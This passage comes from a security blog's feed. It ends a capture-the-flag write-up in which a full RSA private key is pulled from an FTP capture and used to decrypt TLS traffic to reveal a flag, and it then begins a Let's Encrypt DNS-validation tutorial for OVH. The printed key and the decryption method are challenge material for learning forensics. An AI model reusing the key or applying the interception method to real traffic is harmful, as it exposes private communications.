&lt;span class="code-line"&gt;&lt;span class="mi"&gt;200&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;TYPE&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;is&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;now&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nc"&gt;bit&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nc"&gt;binary&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;PORT&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;172&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;17&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;42&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;171&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;159&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="mi"&gt;200&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;PORT&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;command&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;successful&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;STOR&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ssc&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="k"&gt;key&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="mi"&gt;150&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Connecting&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;to&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;port&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;43935&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="mi"&gt;226&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="k"&gt;File&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;successfully&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;transferred&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="mi"&gt;226&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;0.001&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;seconds&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;measured&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;here&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;4.59&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Mbytes&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;per&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;second&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;QUIT&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="mi"&gt;221&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;Goodbye&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;You&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;uploaded&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;and&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;downloaded&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;kbytes&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="mi"&gt;221&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Logout&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;img alt="pcap screenshot" src="/media/2017.01/capture.png"&gt;&lt;/p&gt;
&lt;p&gt;STOR is for transfer file, it seems that a key is transfered. We follow the TCP
stream and get the RSA private key:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="gh"&gt;-----BEGIN PRIVATE KEY-----&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s"&gt;MIIJQwIBADANBgkqhkiG9w0BAQEFAASCCS0wggkpAgEAAoICAQC5twyPH+2U6X0Q&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s"&gt;uxOKPTHSR6MkXGSvAz+Ax+G9DKEiBLuTTfl7dNv4oswdmT9nWlSY1kxZatNwlUF8&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s"&gt;WAuGLntO5xTEmOJlMtBFrWGD+DVpCE9KORGvyif8e4xxi6vh4mkW78IxV03VxHM0&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s"&gt;mk/cq5kkERfWQW81pVeYm9UAm4dj+LcCwQ9aGd/vfTtcACqS5OGtELFbsHJuFVyn&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s"&gt;srpp4K6tLtRk2ensSnmXUXNEjqpodfdb/wqGT86NYg7i6d/4Rqa440a6BD7RKrgp&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s"&gt;YPaXl7pQusemHQPd248fxsuEfEwhPNDJhIb8fDX9BWv2xTfBLhGwOh7euzSh2C4o&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s"&gt;KSuBAO+bIkL+pGY1z7DFtuJYfTOSJyQ5zQzToxS+jE+2x9/3GpD2LUD0xkA8bWhv&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s"&gt;eecq0v6ZWBVYNX54V5ME3s2qxYc6CSQhi6Moy8xWlcSpTSAa7voNQNa9RvQ4/3KF&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s"&gt;3gCbKtFvdd7IHvxfn8vcCrCZ37eVkq0Fl1y5UNeJU/Y0Tt8m7UDn3uKNpB841BQa&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s"&gt;hiGayCSjsHuTS8B+MnpnzWCrzD+rAzCB37B599iBK4t/mwSIZZUZaqxTWNoFS2Lz&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s"&gt;7m0LumZ4Yk8DpDEuWhNs8OUD8FsgAvWFVAvivaaAciF3kMs8pkmNTs2LFBowOshz&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s"&gt;SXfONsHupgXEwwFrKOOZXNhb+O/WKQIDAQABAoICAAT6mFaZ94efft/c9BgnrddC&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s"&gt;XmhSJczfXGt6cF3eIc/Eqra3R3H83wzaaHh+rEl8DXqPfDqFd6e0CK5pud1eD6Y8&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s"&gt;4bynkKI/63+Ct3OPSvdG5sFJqGS7GblWIpzErtX+eOzJfr5N5eNOQfxuCqgS3acu&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s"&gt;4iG3XWDlzuRjgSFkCgwvFdD4Fg5HVU6ZX+cGhh2sDzTRlr+rilXTMsm4K/E8udIg&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s"&gt;yEbv5KqWEI5y+5Eh9gWY7AnGW6TgLNxzfYyt0nhYhI2+Yh4IkRqQd6F8XQARbEhP&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s"&gt;yZx1eK4Q/dRPQxOJNY1KkRpl+Cx6tAPVimByRx1hu82qsTstb6rLHemruOPbf5Dw&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s"&gt;aqgSFdp7it3uqjJHCwJ2hAZoijAcvlhn1sa1hr/qFFlY/WeDAi8OyvGdCSh3OvS6&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s"&gt;yazkah85GOnY85rz+s98F9cvIqcRdGJrAeNbUHHnj6+X9qFVtwDpF0V1vlvn2Ggp&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s"&gt;7m8hiZ0Y+8T+7qfnS9WsdPh7MkoIEoZ0CPryYvX+YPLYWqzxtCvrRWF8tAScI6H+&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s"&gt;XBz3NlCAUaOk+ZOkKlZ8ZYMSn/g5EV2jj/mwZVdtYoeQjLaCDuLq8E1Hswnpgq7F&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s"&gt;54hHU7vOeJ1/TQltLCNfJFQRaUD+tPz9R6jVpbqBiXxIC2eiGTo1rP4Ii7hsQRFC&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s"&gt;W0KKqu+bV69HJAmi06yBAoIBAQDvz+c+3z9njQFFaeUUqyzl31HOzRHmWhJEoriR&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s"&gt;nRhWTLzqMyn+RLGrD3DJQj/dGH6tyxHJ7PdI7gtJ3qaF4lCc2dKR3uQW3CBKI9Ys&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s"&gt;wzjBWOTijafbttXHanXEwXR3vnPk+sH52BqTXZQVA5vzPwIPJnz3H6E9hL66b/uM&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s"&gt;DS9owYRBmykXlV9Gt91Vl5cpg3yxPixaeLMhqDD2Ebq6OFyuacExQHfGUeP0Va/A&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s"&gt;IdM9+H5DE13qR2INX+N0kAFyFzW7k8AvY37KGZdoACUrDzmmGoilfs/pFAC0kZaZ&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s"&gt;tKXoR9iLNxWSBtlI2Fr3qz4gc5nItYb7JSQsdu6Lc92+9z4xAoIBAQDGQFDXVQyk&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s"&gt;Q5tsWicru5v2c9VoFpLUtBg4Dx3uXOMEVl/S5hZ8jYbUH4dcwKyLCYQLtNSc9aei&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s"&gt;8zm18TdOGm0nCLOo7OPMeet+JHyx8uz1l/Sx4ucI/Jq3yVSTqdtXYakxzijTldNQ&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s"&gt;M7YnjpBcs0yDk806R7J3xvxZNMbElQH1bP947Ej0sv40cBcA0hdpjuuNI5C2Ot4P&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s"&gt;fUZXfqR34L7aPZPuP82W2WqFgkTyMY8FO235qR+Sy5xrcHSS4L1FdF+PhS5ZjiPN&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s"&gt;sUdXRvfNFQlKZRUyqB147XY7EDnx6BZW2aoM7AiYPiGhxZeV4NHy1ChdBO2CSmOA&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s"&gt;03FvucMEmUF5AoIBAD2xorAOBuXA5L7Sy1hR4S8SEJ2/LAeyzFhT9F+hpo0tGLy3&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s"&gt;hOohCgQT6NQd8wgSMSTMxTrJd6SPeN/8I6L14f84Gm/kg5FN+BCav5KsdoFnORr/&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s"&gt;jlt74et3e+yuSCQ2HuKdkCGScuPOgzYUw54Ea6cyI5v/yx9kcxzLik8xZSzx+/BU&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s"&gt;1nF2wBgVXR+T7BOF/CIs+IQd4RebiV0EmqElttI36rec+jNPBfHpyVkIWqvqrbDb&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s"&gt;3qFS0+rU7FMkaPrM9cnX7O1ED242vzjGMMmvFQmicd0BjsNLnhLWEYRhcP0c3pyS&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s"&gt;Az6Z/HQ9FMn6h/UZSErWSG970p6NyjieCkICoUECggEBALdyXhvTPD5nvNL3XRWv&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s"&gt;pXLY3plRgg7Gkz6UZmrhksO5tTOu6xHX1/JDNntSYpbJeGFos/CFs9gp3rYH/dgM&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s"&gt;xgH/oFdo1KWqD4oK80OqeTAMq0VLo+OB8xyrdNKqsydZXDmU/dxD4GRvZVeXKOhO&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s"&gt;lTePtbD/FRqWi310Q5U2GLjkYkWfxyZ+1pDpQ6/jt/xaXoacaVTmhgKpNkTSEBhJ&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s"&gt;Y/EIV/F3IqM6jcH6uBewWhpKUspZf7jTJeuZBJXA1gMF20MvxqLhzymPqGcPaU9g&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s"&gt;7tbjUEkunQ8AFI40xpmc28cD5MHOS2ms3GwYLdtnTH65aJwiajBM62QSw/3RU67W&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s"&gt;rWkCggEBAOtMBi9ko4ZR96BCFcuyPsiMcoDBQBEFgH/drT3hMlwmmVt5dcInw3Zk&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s"&gt;DQb3gIWHP1Ul//Ma8qwSeuIua0+6wkQ3NcsDywlJ2cqfZUe7kVJTCl8fuudTAYqT&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s"&gt;Bs5Y1ktYPSyQOxmidMeX5IcGe5fPSdpFu9wMXXQ31l8o9SzccFKwz1P1o8G00xvx&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s"&gt;wtcfAZ204Dcrdfm6xTWmzMrHqngS1uUDOJbW175gQqeAszy8wLMz41Yau3ypk3ga&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s"&gt;edWr4Hzbiph0V1Dv/V+kmmreWBmHetH6bhrTWQq3UZ5WbGMpiTmSsD0EXU5vZLbX&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s"&gt;xmZSEXjNvG9grjxwR96vp1PK/4Bq1jo=&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="gh"&gt;-----END PRIVATE KEY-----&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We &lt;a href="https://blogs.technet.microsoft.com/nettracer/2013/10/12/decrypting-ssltls-sessions-with-wireshark-reloaded/"&gt;import the key in wireshark&lt;/a&gt;
with the IP of the server and we can follow the SSL stream:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nf"&gt;POST&lt;/span&gt; &lt;span class="nn"&gt;/api/user.php&lt;/span&gt; &lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="na"&gt;Host&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;ssc.teaser.insomnihack.ch&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="na"&gt;User-Agent&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:50.0) Gecko/20100101 Firefox/50.0&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="na"&gt;Accept&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;application/json, text/plain, */*&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="na"&gt;Accept-Language&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;en-US,en;q=0.5&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="na"&gt;Accept-Encoding&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;gzip, deflate, br&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="na"&gt;Content-Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;application/x-www-form-urlencoded&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="na"&gt;Referer&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;https://ssc.teaser.insomnihack.ch/login&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;38&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="na"&gt;Cookie&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;PHPSESSID=3u5dqmfudc7ap1di0nmfjgtjm3&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="na"&gt;FLAG&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;INS{OkThatWasWay2Easy}&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;keep-alive&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;action=login&amp;amp;name=rogue&amp;amp;password=rogue&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The header include the flag for this part and the URL for the second part and
the file send by Rogue. But the file is encrypted. This is part 2.&lt;/p&gt;
&lt;h2 id="the-great-escape-part-2"&gt;The great escape - part 2&lt;/h2&gt;
&lt;p&gt;&lt;em&gt;No write up for this challenge&lt;/em&gt;&lt;/p&gt;
&lt;h1 id="disqus-comments"&gt;Disqus comments&lt;/h1&gt;
&lt;p&gt;&lt;em&gt;This is a copy of the Disqus comments for this page&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;rekterino - 2017&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Wireshark didn't decrypt the whole SSL stream for me. Strange.... Only requests to the /sscApp.css were decrypted.&lt;/p&gt;
&lt;p&gt;Also I didn't know the parameter was union injectable so I went with the boolean based blind sql injection which required close to 2 hours to solve the challange.&lt;/p&gt;
&lt;p&gt;Anyways, thanks for the write up.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;maggick - 2017&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Regarding the decryption of SSL traffic using Wireshark, be sure to follow the right TLS flow and to configure the right IP address when importing the private key.
I used the last version of Wireshark in Kali Linux.
Shobot was a really nice challenge :)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;Glenn McGuire 2017&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Had the same issue- update wireshark (or reinstall)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;maggick - 2017&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;As mentioned by Gynvael on irc it is possible to set the IP address to &lt;em&gt;.&lt;/em&gt;.&lt;em&gt;.&lt;/em&gt; when adding the RSA private key, which may help decrypting traffic.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;Glenn McGuire - 2017&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Can also set to 'any' :)&lt;/p&gt;
&lt;/blockquote&gt;</content><category term="security"></category><category term="security"></category><category term="ctf"></category></entry><entry><title>Let's encrypt certificate for offline servers with OVH DNS</title><link href="https://maggick.fr/2016/12/lets-encrypt-certificate-for-offline-servers-with-ovh-dns.html" rel="alternate"></link><published>2016-12-27T11:58:00+01:00</published><updated>2016-12-27T11:58:00+01:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2016-12-27:/2016/12/lets-encrypt-certificate-for-offline-servers-with-ovh-dns.html</id><summary type="html">&lt;p&gt;&lt;a href="https://letsencrypt.org/"&gt;Let's encrypt&lt;/a&gt; provide free and easy SSL certificates. Nevertheless it need to verify that
you own the machine. In order to do that we usually use HTTP verification with
the .well-known directory.&lt;/p&gt;
&lt;p&gt;But sometime our servers are not reachable from the internet. Therefore the HTTP
validation is not possible. Hopefully there is another way the &lt;a href="https://letsencrypt.github.io/acme-spec/"&gt;acme&lt;/a&gt; challenge can be
validated: &lt;a href="https://letsencrypt.github.io/acme-spec/#rfc.section.7.4"&gt;DNS validation&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;In this post we will see how we can generate &lt;a href="https://letsencrypt.org/"&gt;Let's encrypt&lt;/a&gt; SSL certificate for
offline machine with DNS validation for domains hosts by &lt;a href="https://ovh.com"&gt;OVH&lt;/a&gt;.&lt;/p&gt;
</summary><content type="html">&lt;p&gt;&lt;a href="https://letsencrypt.org/"&gt;Let's encrypt&lt;/a&gt; provide free and easy SSL certificates. Nevertheless it need to verify that
you own the machine. In order to do that we usually use HTTP verification with
the .well-known directory.&lt;/p&gt;
&lt;p&gt;But sometime our servers are not reachable from the internet. Therefore the HTTP
validation is not possible. Hopefully there is another way the &lt;a href="https://letsencrypt.github.io/acme-spec/"&gt;acme&lt;/a&gt; challenge can be
validated: &lt;a href="https://letsencrypt.github.io/acme-spec/#rfc.section.7.4"&gt;DNS validation&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;In this post we will see how we can generate &lt;a href="https://letsencrypt.org/"&gt;Let's encrypt&lt;/a&gt; SSL certificate for
offline machine with DNS validation for domains hosts by &lt;a href="https://ovh.com"&gt;OVH&lt;/a&gt;.&lt;/p&gt;


&lt;h2 id="certificate-generation"&gt;Certificate generation&lt;/h2&gt;
&lt;h3 id="requirements"&gt;Requirements&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;A domain name with its DNS hosted by &lt;a href="https://ovh.com"&gt;OVH&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;curl (sudo apt-get install curl)&lt;/li&gt;
&lt;li&gt;Python 2 or 3 and pip (sudo apt-get install python-pip)&lt;/li&gt;
&lt;li&gt;python-ovh (pip install ovh)&lt;/li&gt;
&lt;li&gt;dehydrated (git clone https://github.com/lukas2511/dehydrated)&lt;/li&gt;
&lt;li&gt;OVH hook (git clone https://github.com/antoiner77/letsencrypt.sh-ovh)&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="api-key-generation"&gt;API Key generation&lt;/h3&gt;
&lt;p&gt;We need API keys in order to use the hook script for the DNS validation. For
that, register the application on &lt;a href="https://eu.api.ovh.com/createApp/"&gt;OVH API&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;We get two elements from the website:
* APP_KEY
* APP_SECRET&lt;/p&gt;
&lt;p&gt;We need to put them in our &lt;code&gt;ovh.conf&lt;/code&gt; file in the OVH hook script:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;[default]&lt;/span&gt;
&lt;span class="code-line"&gt;; general configuration: default endpoint&lt;/span&gt;
&lt;span class="code-line"&gt;endpoint=ovh-eu&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;[ovh-eu]&lt;/span&gt;
&lt;span class="code-line"&gt;; configuration specific to &amp;#39;ovh-eu&amp;#39; endpoint&lt;/span&gt;
&lt;span class="code-line"&gt;application_key=APP_KEY&lt;/span&gt;
&lt;span class="code-line"&gt;application_secret=APP_SECRET&lt;/span&gt;
&lt;span class="code-line"&gt;; uncomment following line when writing a script application&lt;/span&gt;
&lt;span class="code-line"&gt;; with a single consumer key.&lt;/span&gt;
&lt;span class="code-line"&gt;;consumer_key=MA_CLEFS&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

